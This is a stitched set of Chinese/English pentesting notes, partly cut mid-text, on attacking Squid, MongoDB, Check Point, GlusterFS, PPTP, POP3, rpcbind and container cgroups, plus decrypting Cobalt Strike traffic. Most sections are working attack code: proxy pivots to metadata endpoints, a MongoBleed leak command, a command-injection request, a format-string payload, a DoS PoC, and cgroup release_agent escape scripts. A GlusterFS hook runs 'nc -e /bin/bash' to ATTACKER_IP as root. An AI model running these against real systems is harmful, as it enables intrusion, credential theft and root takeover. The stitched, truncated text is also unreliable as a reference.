cJSON_GetObjectItem(request, "cmd")->valuestring;memset(buf, 0, sizeof(buf));memcpy(buf, cmd, strlen(cmd)); // no bound check # 工具与参考入口 https://github.com/pmarrapese/iot/tree/master/p2p/lansearch A look at a P2P camera (LookCam app) – Almost Secure LookCam analysis (Warwick University, 2023) General PPPP analysis – Elastic Security Labs (2024) CS2 Network sales deck (2016) – PPPP/threat model Anyka hardened community firmware # 检查清单 是否确认授权范围与目标集合 是否区分被动线索和主动探测结果 是否保留输入列表与输出摘要 是否把结果回写到资产 / 服务图谱 # 关联 侦察与枚举总览 知识地图 云身份与权限 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

However, if it's configured with HTTP 认证 you will be prompted for usernames and 密码. You can also try to abuse the proxy to scan internal ports proxifying nmap.\ For proxies requiring 认证，append 凭据 to the configuration by including the username and 密码 at the end: http 10.10.10.10 3128 username passw0rd. Then run nmap with proxychains to scan the host from local: proxychains nmap -sT -n -p- localhost Alternatively, the Squid Pivoting Open Port Scanner (spose.py) can be used. Misconfigured Squid deployments sometimes expose the Cache Manager, which can leak version info, counters, ACL hints, peer configuration, and sometimes the full running configuration. Scan “from” the proxy: run SPOSE through Squid to enumerate ports reachable from the proxy host/loopback. With uv you can install deps and scan all TCP ports directly: Manager exposure: /squid-internal-mgr/menu and related pages often disclose enough information to accelerate 横向移动. # 命令 / 载荷 / 操作片段 # 1. Basic Information 12PORT STATE SERVICE VERSION3128/tcp open http-proxy Squid http proxy 4.11 # 2. Web Proxy 12# Try to proxify curlcurl --proxy http://10.10.11.131:3128 http://10.10.11.131 # 3. Open-proxy / egress validation 123456789# Fast open-proxy detectionnmap -Pn -sV -p 3128 --script http-open-proxy <IP># Confirm egress and learn the public IP used by the proxycurl -x http://<IP>:3128 https://ifconfig.me -I# If authentication is required, curl will usually show 407 Proxy Authentication Requiredcurl -x http://<IP>:3128 http://example.com -vcurl -x http://user:pass@<IP>:3128 http://example.com -v # 4. SPOSE Scanner 1python spose.py --proxy http://10.10.11.131:3128 --target 10.10.11.131 # 5. Cache Manager 枚举 12345678910# Enumerate available manager actionscurl http://<IP>:3128/squid-internal-mgr/menu# Common high-value pagescurl http://<IP>:3128/squid-internal-mgr/infocurl http://<IP>:3128/squid-internal-mgr/counterscurl http://<IP>:3128/squid-internal-mgr/active_requests# If cachemgr_passwd is configured and HTTP Basic auth is acceptedcurl -u any:PASSWORD http://<IP>:3128/squid-internal-mgr/config # 6. ACL 绕过 /internal reachability tests 123456789# Direct HTTP requests to RFC1918 / loopback targets through the proxycurl -x http://<IP>:3128 http://127.0.0.1:8080/ -vcurl -x http://<IP>:3128 http://[::1]:8080/ -vcurl -x http://<IP>:3128 http://169.254.169.254/latest/meta-data/ -vcurl -x http://<IP>:3128 http://192.168.1.10:8000/ -v# Force a CONNECT tunnel to a normally unreachable serviceopenssl s_client -proxy <IP>:3128 -connect 127.0.0.1:443 -quietopenssl s_client -proxy <IP>:3128 -connect 10.10.10.20:8443 -quiet # 7. Pivot & tooling configuration 12uv add --script spose.py -r requirements.txtuv run spose.py --proxy http://SQUID_IP:3128 --target localhost --allports # 8. Pivot & tooling configuration 12[ProxyList]http SQUID_IP 3128 # 9. Pivot & tooling configuration 1proxychains curl http://127.0.0.1:9191 -v # 工具与参考入口 spose.py uv The Cache Manager：Squid Web Cache wiki Squid Caching Proxy Security Audit: 55 vulnerabilities and 35 0days HTB Bamboo walkthrough (Squid pivoting example) # 检查清单 是否确认授权范围与目标集合 是否区分被动线索和主动探测结果 是否保留输入列表与输出摘要 是否把结果回写到资产 / 服务图谱 # 关联 侦察与枚举总览 知识地图 侦察枚举流水线 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Server version must be within the vulnerable ranges (3.6, 4.0, 4.2, 4.4.0–4.4.29, 5.0.0–5.0.31, 6.0.0–6.0.26, 7.0.0–7.0.27, 8.0.0–8.0.16, 8.2.0–8.2.2). net.compression.compressors or networkMessageCompressors must include zlib (default on many builds). Check it from the shell with: The attacker only needs network access to the MongoDB port. No 认证 is necessary. # 命令 / 载荷 / 操作片段 # 1. Basic Information 12PORT STATE SERVICE VERSION27017/tcp open mongodb MongoDB 2.6.9 2.6.9 # 2. Manual 1234567891011from pymongo import MongoClientclient = MongoClient(host, port, username=username, password=password)client.server_info() #Basic info#If you have admin access you can obtain more infoadmin = client.adminadmin_info = admin.command("serverStatus")cursor = client.list_databases()for db in cursor: print(db) print(client[db["name"]].list_collection_names())#If admin access, you could dump the database also # 3. Manual 123456show dbsuse <db>show collectionsdb.<collection>.find() #Dump the collectiondb.<collection>.count() #Number of records of the collectiondb.current.find({"username":"admin"}) #Find in current db the username admin # 4. Automatic 1nmap -sV --script "mongo* and default" -p 27017 <IP> #By default all the nmap mongo enumerate scripts are used # 5. Login 1234mongo <HOST>mongo <HOST>:<PORT>mongo <HOST>:<PORT>/<DB>mongo <database> -u <username> -p '<password>' # 6. Login 1nmap -n -sV --script mongodb-brute -p 27017 <ip> # 7. Brute force 12grep "noauth.*true" /opt/bitnami/mongodb/mongodb.conf | grep -v "^#" #Not neededgrep "auth.*true" /opt/bitnami/mongodb/mongodb.conf | grep -v "^#\|noauth" #Not needed # 8. Exposure requirements & quick checks 1db.adminCommand({getParameter: 1, networkMessageCompressors: 1}) # 9. 利用 & harvesting workflow 1python3 mongobleed.py --host <target> --max-offset 50000 --output leaks.bin # 10. 检测 noise signal (high-rate connections) 12345678910111213141516171819// High-velocity inbound connections to mongod/mongod.exe (possible MongoBleed probing)dataset = xdr_data| filter event_type = ENUM.NETWORK| filter lowercase(actor_process_image_name) in ("mongod", "mongod.exe")| filter action_network_is_server = true| filter action_remote_ip not in (null, "")| filter incidr(action_remote_ip, "10.0.0.0/8") != true and incidr(action_remote_ip, "192.168.0.0/16") != true and incidr(action_remote_ip, "172.16.0.0/12") != true and incidr(action_remote_ip, "127.0.0.0/8") != true and incidr(action_remote_ip, "169.254.0.0/16") != true and incidr(action_remote_ip, "224.0.0.0/4") != true and incidr(action_remote_ip, "255.255.255.255/32") != true and incidr(action_remote_ip, "198.18.0.0/15") != true| filter action_network_session_duration <= 5000| bin _time span = 1m| comp count(_time) as Counter by agent_hostname, action_remote_ip, _time| filter Counter >= 500 # 工具与参考入口 from here https://github.com/andresriancho/mongo-objectid-predict Unit 42 – Threat Brief: MongoDB 漏洞 (CVE-2025-14847) MongoDB Security Advisory SERVER-115508 Censys – MongoBleed Advisory MongoBleed PoC (joe-desimone/mongobleed) # 检查清单 是否确认授权范围与目标集合 是否区分被动线索和主动探测结果 是否保留输入列表与输出摘要 是否把结果回写到资产 / 服务图谱 # 关联 侦察与枚举总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

The necessary commands for this operation are outlined below: The output from this command provides detailed information regarding the firewall's certificate name (CN) and organization (O), as demonstrated below: In practice, CN is the gateway object / hostname and O commonly maps to the Internal CA / management naming context. That makes this response useful for building hostlists, targeted DNS brute-force, or prioritizing which management node to enumerate first. If the environment enables Accept Control Connections, several of these services are opened automatically by design, so they are worth rescanning from every new foothold. If valid administrator 凭据 are recovered, move from gateway fingerprinting to structured management 枚举. The Check Point Management API is scriptable via mgmt cli or HTTPS web api calls: If that host exposes Gaia Portal and you later recover any delegated admin credential, hostname/DNS write access can become code execution on the appliance or management node. Requirement: The HTTP Security Server or AI HTTP proxy must be enabled and transparently inspecting the targeted port; if HTTP inspection is disabled the vulnerable code path is never reached. Place attacker-controlled dwords up front so %x, %s, and %n directives treat them as stack arguments. Use % x/% s to leak pointers, then % n/% hn to write the formatted byte count into chosen addresses, overwriting return pointers, vtables, or heap metadata before hijacking execution with injected shellcode or ROP 返回导向编程. # 命令 / 载荷 / 操作片段 # 1. Obtaining Firewall and Management Station Names 12use auxiliary/gather/checkpoint_hostnameset RHOST 10.10.10.10 # 2. Obtaining Firewall and Management Station Names 12345[*] Attempting to contact Checkpoint FW1 SecuRemote Topology service...[+] Appears to be a CheckPoint Firewall...[+] Firewall Host: FIREFIGHTER-SEC[+] SmartCenter Host: FIREFIGHTER-MGMT.example.com[*] Auxiliary module execution completed # 3. Alternative Method for Hostname and ICA Name Discovery 1printf '\x51\x00\x00\x00\x00\x00\x00\x21\x00\x00\x00\x0bsecuremote\x00' | nc -q 1 10.10.10.10 264 | grep -a CN | cut -c 2- # 4. Alternative Method for Hostname and ICA Name Discovery 1CN=Panama,O=MGMTT.srv.rxfrmi # 5. Post-Discovery 枚举 1nmap -Pn -sT -p 264,443,18190,18191,18210,18211,18231,18264 <gateway-or-management-ip> # 6. Post-Discovery 枚举 123mgmt_cli login -u <user> -p '<pass>' -m <mgmt_ip> > id.txtmgmt_cli show gateways-and-servers details-level full -s id.txt --format json | jq '.objects[] | {name, type, ipv4_address}'mgmt_cli logout -s id.txt # 7. Recent Authenticated Management-Plane Abuse 1234POST /cgi-bin/hosts_dns.tclhostname=test|`id`domainname=lab.localsave=true # 8. Triggering the error handler 1printf 'BOGUS%%08x%%08x%%08x%%n HTTP/1.0
Host: internal.local

' | nc -nv [FIREWALL_IP] 80 # 工具与参考入口 http://xforce.iss.net/xforce/alerts/id/162 https://support.checkpoint.com/results/sk/sk62692 https://support.checkpoint.com/results/sk/sk181311 # 检查清单 是否确认授权范围与目标集合 是否区分被动线索和主动探测结果 是否保留输入列表与输出摘要 是否把结果回写到资产 / 服务图谱 # 关联 侦察与枚举总览 知识地图 Pwn 基础链路 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

The volume contains cronjob templates that run with root on every node. # 命令 / 载荷 / 操作片段 # 1. Basic Information 123PORT STATE SERVICE VERSION24007/tcp open glusterd GlusterFS (RPC)49152/tcp open gluster-brick SSL (TLS optional) # 2. 枚举 1sudo apt install -y glusterfs-cli glusterfs-client # Debian/Ubuntu # 3. 枚举 12# List peers (works without authentication in default setups)gluster --remote-host 10.10.11.131 peer status # 4. 枚举 12# Retrieve the list of all volumes and their configurationgluster --remote-host 10.10.11.131 volume info all # 5. 枚举 1sudo mount -t glusterfs 10.10.11.131:/<vol_name> /mnt/gluster # 6. Certificate troubleshooting 123/etc/ssl/glusterfs.pem/etc/ssl/glusterfs.key/etc/ssl/glusterfs.ca # 7. Exploiting gluster shared storage (权限提升) 1234567891011# 1. Mount admin volume anonymouslymkdir /tmp/gss && sudo mount -t glusterfs 10.10.11.131:/gluster_shared_storage /tmp/gss# 2. Drop malicious script that gets synchronised cluster-widecat <<'EOF' > /tmp/gss/hooks/1/start/post/test.sh#!/bin/bashnc -e /bin/bash ATTACKER_IP 4444 &EOFchmod +x /tmp/gss/hooks/1/start/post/test.sh# 3. Wait until glusterd distributes the hook and executes it as root # 8. Denial-of-Service PoC (CVE-2023-26253) 1234567#!/usr/bin/env python3# Minimal reproducer: sends malformed NOTIFY_REPLY XDR frame to 24007import socket, xdrlib, structp = xdrlib.Packer(); p.pack_uint(0xdeadbeef)with socket.create_connection(("10.10.11.131",24007)) as s: s.send(struct.pack("!L", len(p.get_buffer())|0x80000000)) s.send(p.get_buffer()) # 9. Hardening & 检测 12gluster volume set <vol> transport.socket.ssl on gluster volume set <vol> transport.socket.ssl-cert /etc/ssl/glusterfs.pem # 10. Hardening & 检测 1gluster volume set <vol> auth.allow 10.0.0.0/24 # 工具与参考入口 GlusterFS security advisories CVE-2023-26253 PoC – github.com/tinynetwork/gluster-notify-crash # 检查清单 是否确认授权范围与目标集合 是否区分被动线索和主动探测结果 是否保留输入列表与输出摘要 是否把结果回写到资产 / 服务图谱 # 关联 侦察与枚举总览 知识地图 AD CS 证书攻击 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/侦察与枚举/1723：Pentesting PPTP 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # 1723：Pentesting PPTP 技术笔记 [!summary] 提炼定位 面向 侦察与枚举 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 1723：Pentesting PPTP 技术笔记 建立资产、入口、服务、身份或技术栈线索。 先被动收集，再主动验证；把可复现证据沉淀为后续攻击面。 # 中文提炼 核心目标是把 1723：Pentesting PPTP 技术笔记 转化为可验证资产或服务线索，而不是停留在未确认情报。 优先关注：1723：Pentesting PPTP、Basic Information、枚举、Brute Force、Attack Notes；每条发现都要标注来源、时间、目标和可信度。 主动探测前先去重和收敛范围，避免把 CDN、第三方 SaaS 或无授权资产混入后续验证。 输出应沉淀为资产清单、服务清单、指纹差异和下一步验证入口。 本页已沉淀 9 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 1723：Pentesting PPTP Basic Information 枚举 Brute Force Attack Notes MS-CHAPv2 handshake capture Convert the handshake into a hashcat workload Parse and decrypt with chapcrack Crack challenge/response material Protocol weakness summary # 核心要点 That means a packet capture is often enough to move the attack offline. If you can sniff the initial connection, request the user to reconnect, or position yourself on-path, capture the handshake and extract the challenge/response data. Convert the result into a hashcat-compatible NetNTLMv1/ESS style line The exact hashcat representation commonly used for MS-CHAPv2 is: This is operationally useful when you want to keep everything local instead of sending a 令牌 to an external cracking service, or when you already have a tuned hashcat rules/masks workflow. This is especially useful when the goal is not only credential recovery but also session decryption and post-auth traffic analysis. If you already extracted the challenge/response pair, asleap can still be used directly against PPTP/MS-CHAPv2 material: MS-CHAPv2 security effectively collapses to recovering DES-derived material / NT - 哈希 - equivalent secrets, making passive capture much more dangerous than with modern VPNs. Even if the 密码 is not immediately recovered, the handshake can usually be stored and attacked offline later. # 命令 / 载荷 / 操作片段 # 1. 枚举 12nmap -Pn -sSV -p1723 <IP>nmap -Pn -sO --protocol 47 <IP> # 2. 枚举 12sudo tcpdump -ni <iface> 'tcp port 1723 or gre' -w pptp-handshake.pcaptshark -r pptp-handshake.pcap -Y 'pptp || gre || ppp || chap' # 3. MS-CHAPv2 handshake capture 12tshark -r pptp-handshake.pcap -Y 'chap'tshark -r pptp-handshake.pcap -Y 'ppp and chap' # 4. Convert the handshake into a hashcat workload 1<user>::<domain_or_blank>:<peer_challenge>:<nt_response>:<authenticator_challenge> # 5. Convert the handshake into a hashcat workload 1hashcat -m 5500 -a 0 mschapv2.hashes /usr/share/wordlists/rockyou.txt # 6. Parse and decrypt with chapcrack 1chapcrack.py parse -i pptp-handshake.pcap # 7. Parse and decrypt with chapcrack 1chapcrack.py decrypt -i pptp-handshake.pcap -o pptp-decrypted.pcap -n <recovered_nt_hash_or_token> # 8. Crack challenge/response material 1asleap -C 58:16:d5:ac:4b:dc:e4:0f -R 50:ae:a3:0a:10:9e:28:f9:33:1b:44:b1:3d:9e:20:91:85:e8:2e:c3:c5:4c:00:23 -W /usr/share/wordlists/rockyou.txt # 9. Crack challenge/response material 1./assless-chaps <challenge> <response> <hashes.db> # 工具与参考入口 https://github.com/moxie0/chapcrack https://github.com/sensepost/assless-chaps https://www.rfc-editor.org/rfc/rfc2759.html https://hashcat.net/wiki/doku.php?id=example hashes # 检查清单 是否确认授权范围与目标集合 是否区分被动线索和主动探测结果 是否保留输入列表与输出摘要 是否把结果回写到资产 / 服务图谱 # 关联 侦察与枚举总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Datagram distribution service for connectionless communication (port: 138/udp). Session service for connection-oriented communication (port: 139/tcp). For a device to participate in a NetBIOS network, it must have a unique name. This is achieved through a broadcast process where a "Name Query" packet is sent. If you find the service NFS then probably you will be able to list and 下载 (and maybe 上传) files: Read 2049：Pentesting NFS service to learn more about how to test this protocol. Exploring NIS vulnerabilities involves a two-step process, starting with the identification of the service ypbind. The cornerstone of this exploration is uncovering the NIS domain name, without which progress is halted. The final and crucial step involves the ypcat command to extract sensitive data, particularly encrypted user passwords. These hashes, once cracked using 工具 like John the Ripper, reveal insights into system access and privileges. You could enumerate users of the box. To learn how read 1026：Pentesting Rsusersd. # 命令 / 载荷 / 操作片段 # 1. Basic Information 12PORT STATE SERVICE111/tcp open rpcbind # 2. 枚举 12rpcinfo irked.htbnmap -sSUC -p111 192.168.10.1 # 3. Advanced rpcinfo usage 12rpcinfo -T udp -p 10.10.10.10showmount -e 10.10.10.10 # 4. NIS 123456# Install NIS toolsapt-get install nis# Ping the NIS server to confirm its presenceypwhich -d <domain-name> <server-ip># Extract user credentialsypcat –d <domain-name> –h <server-ip> passwd.byname # 5. HackTricks Automatic Commands 123456789101112131415161718192021Protocol_Name: Portmapper #Protocol Abbreviation if there is one.Port_Number: 43 #Comma separated if there is more than one.Protocol_Description: PM or RPCBind #Protocol Abbreviation Spelled outEntry_1: Name: Notes Description: Notes for PortMapper Note: | Portmapper is a service that is utilized for mapping network service ports to RPC (Remote Procedure Call) program numbers. It acts as a critical component in Unix-based systems, facilitating the exchange of information between these systems. The port associated with Portmapper is frequently scanned by attackers as it can reveal valuable information. This information includes the type of Unix Operating System (OS) running and details about the services that are available on the system. Additionally, Portmapper is commonly used in conjunction with NFS (Network File System), NIS (Network Information Service), and other RPC-based services to manage network services effectively. https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-rpcbind.htmlEntry_2: Name: rpc info Description: May give netstat-type info Command: whois -h {IP} -p 43 {Domain_Name} && echo {Domain_Name} | nc -vn {IP} 43Entry_3: Name: nmap Description: May give netstat-type info Command: nmap -sSUC -p 111 {IP} # 工具与参考入口 this link Irked HTB machine Nmap NSE: rpc-grind # 检查清单 是否确认授权范围与目标集合 是否区分被动线索和主动探测结果 是否保留输入列表与输出摘要 是否把结果回写到资产 / 服务图谱 # 关联 侦察与枚举总览 知识地图 侦察枚举流水线 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

POP servers with the setting auth debug enabled will be increasing the logs generated. However, if auth debug passwords or auth verbose passwords are set as true, 密码 could be also logged in clear text in those logs. # 命令 / 载荷 / 操作片段 # 1. Basic Information 12PORT STATE SERVICE110/tcp open pop3 # 2. Banner Grabbing 12nc -nv <IP> 110openssl s_client -connect <IP>:995 -crlf -quiet # 3. Automated 1nmap --script "pop3-capabilities or pop3-ntlm-info" -sV -port <PORT> <IP> #All are default scripts # 4. POP syntax 1234567891011POP commands: USER uid Log in as "uid" PASS password Substitue "password" for your actual password STAT List number of messages, total mailbox size LIST List messages and sizes RETR n Show message n DELE n Mark message n for deletion RSET Undo any changes QUIT Logout (expunges messages if no RSET) TOP msg n Show first n lines of message number msg CAPA Get capabilities # 5. POP syntax 12345678910111213141516171819202122root@kali:~# telnet $ip 110 +OK beta POP3 server (JAMES POP3 Server 2.3.2) ready USER billydean +OK PASS password +OK Welcome billydean list +OK 2 1807 1 786 2 1021 retr 1 +OK Message follows From: jamesbrown@motown.com Dear Billy Dean, Here is your login for remote desktop ... try not to forget it this time! username: billydean password: PA$$W0RD!Z # 6. HackTricks Automatic Commands 12345678910111213141516171819202122232425262728293031323334353637Protocol_Name: POP #Protocol Abbreviation if there is one.Port_Number: 110 #Comma separated if there is more than one.Protocol_Description: Post Office Protocol #Protocol Abbreviation Spelled outEntry_1: Name: Notes Description: Notes for POP Note: | Post Office Protocol (POP) is described as a protocol within the realm of computer networking and the Internet, which is utilized for the extraction and retrieval of email from a remote mail server**, making it accessible on the local device. Positioned within the application layer of the OSI model, this protocol enables users to fetch and receive email. The operation of POP clients typically involves establishing a connection to the mail server, downloading all messages, storing these messages locally on the client system, and subsequently removing them from the server. Although there are three iterations of this protocol, POP3 stands out as the most prevalently employed version. https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-pop.htmlEntry_2: Name: Banner Grab Description: Banner Grab 110 Command: nc -nv {IP} 110Entry_3: Name: Banner Grab 995 Description: Grab Banner Secure Command: openssl s_client -connect {IP}:995 -crlf -quietEntry_4: Name: Nmap Description: Scan for POP info Command: nmap --script "pop3-capabilities or pop3-ntlm-info" -sV -p 110 {IP}Entry_5: Name: Hydra Brute Force Description: Need User Command: hydra -l {Username} -P {Big_Passwordlist} -f {IP} pop3 -VEntry_6: Name: consolesless mfs enumeration Description: POP3 enumeration without the need to run msfconsole Note: sourced from https://github.com/carlospolop/legion Command: msfconsole -q -x 'use auxiliary/scanner/pop3/pop3_version; set RHOSTS {IP}; set RPORT 110; run; exit' # 工具与参考入口 here # 检查清单 是否确认授权范围与目标集合 是否区分被动线索和主动探测结果 是否保留输入列表与输出摘要 是否把结果回写到资产 / 服务图谱 # 关联 侦察与枚举总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Whenever you identify an RMI endpoint, you should give it a try: The output of the 枚举 action is explained in more detail in the documentation pages of the project. Depending on the outcome, you should try to verify identified vulnerabilities. The ObjID values displayed by remote-method-guesser can be used to determine the uptime of the service. This may allows to identify other vulnerabilities: Unfortunately, Java RMI does not support enumerating methods on remote objects . That being said, it is possible to bruteforce method signatures with 工具 like remote-method-guesser or rmiscout: Or you can perform deserialization attacks like this: Attacking Java RMI services after JEP 290 # 命令 / 载荷 / 操作片段 # 1. 中文提炼 核心目标是确认 流量分析 - CobaltStrike 涉及的账号、项目 / 订阅、角色、资源和控制平面边界。 优先关注：流量特征、流量解密；身份权限、元数据、密钥、审计日志和网络暴露要一起看。 验证云权限时使用只读枚举优先，任何资源创建、策略修改或跨账号操作都要单独记录和回滚。 容器 / Kubernetes 场景要区分 Pod 内权限、ServiceAccount、RBAC、节点权限和宿主机逃逸面。 本页已沉淀 10 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 流量特征 流量解密 # 核心要点 https-beacon 通信中，默认使用空证书建立加密通道。 .cobaltstrike.beacon keys 文件，该文件本质上为 KeyPair 的 Java 对象，Python 的 javaobj-py3 库可以直接读取里面存储的数据。 Cobalt Strike 的 Beacon 通信主要依赖于 AES key 和 HMAC key 。这两个密钥都是由 Beacon 在每次执行时随机生成的 16 字节数据。 HMAC key ：这个密钥用于验证数据的完整性和真实性。HMAC （哈希 - based Message 认证 Code）是一种基于密钥的哈希算法，用于在不安全的通信环境中验证消息的完整性和真实性。 # 命令 / 载荷 / 操作片段 # 1. 流量特征 1http.request.method==POST # 2. 流量特征 1tls # 3. 流量特征 1234JA372a589da586844d7f0818ce684948eeaa0e9f5d64349fb13191bc781f81f42e1 # 4. 流量特征 1234JA3sb742b407517bac9536a77a7b0fee28e9ae4edc6faf64d08308082ad26be60767 # 5. 流量解密 123456789101112131415161718import base64import javaobj.v2 as javaobjwith open(".cobaltstrike.beacon_keys", "rb") as fd:pobj = javaobj.load(fd)def format_key(key_data, key_type):key_data = bytes(map(lambda x: x & 0xFF, key_data))formatted_key = f"-----BEGIN {key_type} KEY-----\n"formatted_key += base64.encodebytes(key_data).decode()formatted_key += f"-----END {key_type} KEY-----"return formatted_keyprivateKey = format_key(pobj.array.value.privateKey.encoded.data, "PRIVATE")publicKey = format_key(pobj.array.value.publicKey.encoded.data, "PUBLIC")print(privateKey)print(publicKey) # 6. 流量解密 123456789101112131415161718192021222324import hashlibfrom Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_v1_5import base64import hexdumpPRIVATE_KEY = """[REDACTED_PRIVATE_KEY_BLOCK]"""encode_data = ""private_key = RSA.import_key(PRIVATE_KEY.encode())cipher = PKCS1_v1_5.new(private_key)ciphertext = cipher.decrypt(base64.b64decode(encode_data), 0)if ciphertext[0:4] == b'\x00\x00\xBE\xEF':raw_aes_keys = ciphertext[8:24]raw_aes_hash256 = hashlib.sha256(raw_aes_keys).digest()aes_key = raw_aes_hash256[0:16]hmac_key = raw_aes_hash256[16:]print("AES key: {}".format(aes_key.hex()))print("HMAC key: {}".format(hmac_key.hex()))hexdump.hexdump(ciphertext) # 7. 流量解密 12345678import base64encode_data = ''bytes_data = bytes.fromhex(encode_data)encrypt_data = base64.b64encode(bytes_data)print(encrypt_data.decode()) # 8. 流量解密 123456789101112131415161718192021222324252627282930313233import hmacimport binasciiimport base64import hexdumpfrom Crypto.Cipher import AESSHARED_KEY = binascii.unhexlify("")HMAC_KEY = binascii.unhexlify("")encrypt_data = ""def decrypt(encrypted_data, iv_bytes, signature, shared_key, hmac_key):if hmac.new(hmac_key, encrypted_data, digestmod="sha256").digest()[:16] != signature:print("message authentication failed")returncipher = AES.new(shared_key, AES.MODE_CBC, iv_bytes)return cipher.decrypt(encrypted_data)encrypt_data = base64.b64decode(encrypt_data)encrypt_data_length = int.from_bytes(encrypt_data[:4], byteorder='big', signed=False)encrypt_data_l = encrypt_data[4:]data1 = encrypt_data_l[:encrypt_data_length-16]signature = encrypt_data_l[encrypt_data_length-16:encrypt_data_length]iv_bytes = b"abcdefghijklmnop"dec = decrypt(data1, iv_bytes, signature, SHARED_KEY, HMAC_KEY)print("counter: {}".format(int.from_bytes(dec[:4], byteorder='big', signed=False)))print("任务返回长度: {}".format(int.from_bytes(dec[4:8], byteorder='big', signed=False)))print("任务输出类型: {}".format(int.from_bytes(dec[8:12], byteorder='big', signed=False)))print(dec[12:int.from_bytes(dec[4:8], byteorder='big', signed=False)])print(hexdump.hexdump(dec)) # 9. 流量解密 123file_path = ".cobaltstrike.beacon_keys路径"encode_data = "元数据"encrypt_data = "任务数据" # 10. 流量解密 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657import hmacimport base64import hashlibimport hexdumpimport binasciiimport javaobj.v2 as javaobjfrom Crypto.Cipher import AESfrom Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_v1_5file_path = ".cobaltstrike.beacon_keys"encode_data = "PcdKQuOPNdlyJMzB9IdLt3FyYJK5ooh2hagReIiCPX3enVE8IUWclknGedXTxAW6Seq0pUuqbA3d6h59a43lQH+2l4egkNL/aTuaMndjIcrM7HFHDQSumu/VoeG+O9vNB63W6YtJDidYt+SjFCZPOjcTblEU+CDGzN4xNO+bh1s="encrypt_data = "000000c0cc3581241436712c84735d65bf5faa7ac3da1ac1b7583bea79d54c00c517866397786623818cb11af81460bf963e7da0be7bd4c8afc27d4d7efb783ce7d3a889d14dada2a851f0b2919af4242efdc0e43ad80053b5d7ffc933416e

Drop a 载荷 that will be visible from the host path: The effect is host-side execution of the 载荷 with host root privileges. In a real 利用，the 载荷 usually writes a proof file, spawns a 反弹 Shell, or modifies host state. If mount | grep cgroup shows cgroup v1, older breakout writeups become more relevant. # 命令 / 载荷 / 操作片段 # 1. Inspection 12cat /proc/self/cgroupfindmnt -T /sys/fs/cgroup # 2. Inspection 123ls -l /sys/fs/cgroupcat /sys/fs/cgroup/cgroup.controllerscat /sys/fs/cgroup/cgroup.subtree_control # 3. Lab 123docker run --rm -it --memory=256m debian:stable-slim bashcat /proc/self/cgroupcat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null # 4. Lab 12docker run --rm -it --pids-limit=64 debian:stable-slim bashcat /sys/fs/cgroup/pids.max 2>/dev/null # 5. Classic PoC 1234567891011121314d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))mkdir -p "$d/w"echo 1 > "$d/w/notify_on_release"t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)touch /oecho "$t/c" > "$d/release_agent"cat <<'EOF' > /c#!/bin/shps aux > "$t/o"EOFchmod +x /csh -c "echo 0 > $d/w/cgroup.procs"sleep 1cat /o # 6. Readable Walk-Through 1234mkdir /tmp/cgrpmount -t cgroup -o rdma cgroup /tmp/cgrp # or memory if available in v1mkdir /tmp/cgrp/xecho 1 > /tmp/cgrp/x/notify_on_release # 7. Readable Walk-Through 12host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)echo "$host_path/cmd" > /tmp/cgrp/release_agent # 8. Readable Walk-Through 12345cat <<'EOF' > /cmd#!/bin/shps aux > /outputEOFchmod +x /cmd # 9. Readable Walk-Through 123sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"sleep 1cat /output # 10. Relative Path Variant Using /proc/<pid>/root 123456789101112131415161718192021222324252627282930313233343536373839404142434445#!/bin/shOUTPUT_DIR="/"MAX_PID=65535CGROUP_NAME="xyx"CGROUP_MOUNT="/tmp/cgrp"PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"OUTPUT_NAME="${CGROUP_NAME}_payload.out"OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"sleep 10000 &cat > ${PAYLOAD_PATH} << __EOF__#!/bin/shOUTPATH=\$(dirname \$0)/${OUTPUT_NAME}ps -eaf > \${OUTPATH} 2>&1__EOF__chmod a+x ${PAYLOAD_PATH}mkdir ${CGROUP_MOUNT}mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_releaseTPID=1while [ ! -f ${OUTPUT_PATH} ]do if [ $((${TPID} % 100)) -eq 0 ] then echo "Checking pid ${TPID}" if [ ${TPID} -gt ${MAX_PID} ] then echo "Exiting at ${MAX_PID}" exit 1 fi fi echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs" TPID=$((${TPID} + 1))donesleep 1cat ${OUTPUT_PATH} # 11. CVE-2022-0492 Variant 123456789apk add --no-cache util-linuxunshare -UrCm sh -c ' mkdir /tmp/c mount -t cgroup -o memory none /tmp/c echo 1 > /tmp/c/notify_on_release echo /proc/self/exe > /tmp/c/release_agent (sleep 1; echo 0 > /tmp/c/cgroup.procs) & while true; do sleep 1; done' # 12. Only limited mappings are allowed, and for gid map the writer 